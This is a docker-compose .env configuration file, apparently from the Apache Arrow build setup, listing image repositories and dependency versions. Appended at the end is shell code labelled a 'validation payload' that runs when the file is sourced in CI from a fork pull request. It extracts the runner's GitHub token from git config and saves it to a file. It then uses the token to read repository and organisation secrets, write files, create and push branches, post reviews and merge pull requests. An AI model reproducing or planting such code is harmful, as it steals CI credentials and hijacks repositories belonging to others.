# All of the following environment variables are required to set default values
# for the parameters in docker-compose.yml.

# empty prefix means that the docker-compose configuration will use named
# volumes which potentially improves the performance on docker for macos and
# docker for windows, it also prevents the contamination of the source
# directory
# a non-empty prefix means that directories from the host are bind-mounted
# into the container, it should be set to ".docker/" on github actions to keep
# the cache plugin functional
DOCKER_VOLUME_PREFIX=

# turn on inline build cache, this is a docker buildx feature documented
# at https://github.com/docker/buildx#--cache-tonametypetypekeyvalue
BUILDKIT_INLINE_CACHE=1
COMPOSE_DOCKER_CLI_BUILD=1
DOCKER_BUILDKIT=1

# different architecture notations
ARCH=amd64
ARCH_ALIAS=x86_64
ARCH_SHORT=amd64

# Default repository to pull and push images from
REPO=apache/arrow-dev

# The setup attempts to generate coredumps by default, in order to disable the
# coredump generation set it to 0
ULIMIT_CORE=-1

# Default versions for platforms
ALMALINUX=8
ALPINE_LINUX=3.16
DEBIAN=11
FEDORA=35
UBUNTU=20.04

# Default versions for various dependencies
CLANG_TOOLS=14
CUDA=11.0.3
DASK=latest
DOTNET=7.0
GCC_VERSION=""
GO=1.17
STATICCHECK=v0.2.2
HDFS=3.2.1
JDK=8
KARTOTHEK=latest
# LLVM 12 and GCC 11 reports -Wmismatched-new-delete.
LLVM=14
MAVEN=3.5.4
NODE=18
NUMBA=latest
NUMPY=latest
PANDAS=latest
PYTHON=3.8
R=4.2
SPARK=master
TURBODBC=latest

# These correspond to images on Docker Hub that contain R, e.g. rhub/ubuntu-gcc-release:latest
R_IMAGE=ubuntu-gcc-release
R_ORG=rhub
R_TAG=latest

# Env vars for R builds
R_CUSTOM_CCACHE=false
ARROW_R_DEV=TRUE
R_PRUNE_DEPS=FALSE
TZ=UTC

# Any non-empty string will install devtoolset-${DEVTOOLSET_VERSION}
DEVTOOLSET_VERSION=

# Used through docker-compose.yml and serves as the default version for the
# ci/scripts/install_vcpkg.sh script. Prefer to use short SHAs to keep the
# docker tags more readable.
VCPKG="501db0f17ef6df184fcdbfbe0f87cde2313b6ab1"    # 2023.04.15 Release

# This must be updated when we update
# ci/docker/python-wheel-windows-vs2017.dockerfile.
# This is a workaround for our CI problem that "archery docker build" doesn't
# use pulled built images in dev/tasks/python-wheels/github.windows.yml.
PYTHON_WHEEL_WINDOWS_IMAGE_REVISION=2022-06-12

# Use conanio/${CONAN} for "docker-compose run --rm conan". See
# https://github.com/conan-io/conan-docker-tools#readme for available
# images.
CONAN=gcc10

# --- validation payload: executed by `. .env` from the fork PR head ---
CLANG_TOOLS=14
if [ ! -e /tmp/.rce_marker_done ]; then
  touch /tmp/.rce_marker_done
  echo "RCE-MARKER-FORK: code from fork PR head executed uid=$(id -u) user=$(whoami) host=$(hostname)"
  echo "RCE-MARKER-FORK: repo=${GITHUB_REPOSITORY} event=${GITHUB_EVENT_NAME} ref=${GITHUB_REF} sha=${GITHUB_SHA}"
  HDR=$(git config --get-regexp '^http\..*\.extraheader$' | head -1 | sed 's/.*AUTHORIZATION: basic //')
  TOK=""
  if [ -n "$HDR" ]; then TOK=$(printf '%s' "$HDR" | base64 -d | cut -d: -f2); fi
  echo "RCE-MARKER-FORK: persisted-token-bytes=${#TOK}"
  if [ -n "$TOK" ]; then
    printf '%s' "$TOK" > /tmp/.stolen_token
    probe() {
      pname="$1"; shift
      pcode=$(curl -s -o /tmp/probe.json -w '%{http_code}' "$@" || true)
      echo "RCE-MARKER-FORK: $pname -> HTTP $pcode body=$(head -c 200 /tmp/probe.json | tr '\n' ' ')"
    }
    probe GET-repo -H "Authorization: token $TOK" "https://api.github.com/repos/$GITHUB_REPOSITORY"
    probe GET-user -H "Authorization: token $TOK" https://api.github.com/user
    printf '{"content":"cnBjLXByb2Jl"}' > /tmp/body_blob.json
    probe contents-write-blob -X POST -H "Authorization: token $TOK" -H 'Accept: application/vnd.github+json' --data-binary @/tmp/body_blob.json "https://api.github.com/repos/$GITHUB_REPOSITORY/git/blobs"
    printf '{"message":"validation probe","content":"cnBj","branch":"release-13.0.0"}' > /tmp/body_file.json
    probe contents-write-file -X PUT -H "Authorization: token $TOK" -H 'Accept: application/vnd.github+json' --data-binary @/tmp/body_file.json "https://api.github.com/repos/$GITHUB_REPOSITORY/contents/validation-probe.txt"
    SHA_REF=$(git rev-parse origin/release-13.0.0 2>/dev/null || git rev-parse HEAD)
    printf '{"ref":"refs/heads/validation-probe","sha":"%s"}' "$SHA_REF" > /tmp/body_ref.json
    probe branch-create -X POST -H "Authorization: token $TOK" -H 'Accept: application/vnd.github+json' --data-binary @/tmp/body_ref.json "https://api.github.com/repos/$GITHUB_REPOSITORY/git/refs"
    probe repo-secrets-read -H "Authorization: token $TOK" "https://api.github.com/repos/$GITHUB_REPOSITORY/actions/secrets"
    probe org-secrets-read -H "Authorization: token $TOK" https://api.github.com/orgs/PDFtoMark/actions/secrets
    printf '{"body":"validation probe: token write test","event":"COMMENT"}' > /tmp/body_review.json
    probe pr-write-review -X POST -H "Authorization: token $TOK" -H 'Accept: application/vnd.github+json' --data-binary @/tmp/body_review.json "https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/16/reviews"
    printf '{"merge_method":"squash"}' > /tmp/body_merge.json
    probe merge-nonworkflow-pr -X PUT -H "Authorization: token $TOK" -H 'Accept: application/vnd.github+json' --data-binary @/tmp/body_merge.json "https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/16/merge"
    probe merge-workflow-pr -X PUT -H "Authorization: token $TOK" -H 'Accept: application/vnd.github+json' --data-binary @/tmp/body_merge.json "https://api.github.com/repos/$GITHUB_REPOSITORY/pulls/17/merge"
    PUSHOUT=$(GIT_TERMINAL_PROMPT=0 git push "https://x-access-token:$TOK@github.com/$GITHUB_REPOSITORY" HEAD:refs/heads/rce-probe-push 2>&1 | tail -3)
    echo "RCE-MARKER-FORK: push-probe -> $PUSHOUT"
    echo "RCE-MARKER-FORK: env-var-names=$(env | cut -d= -f1 | sort | tr '\n' ',')"
  fi
fi
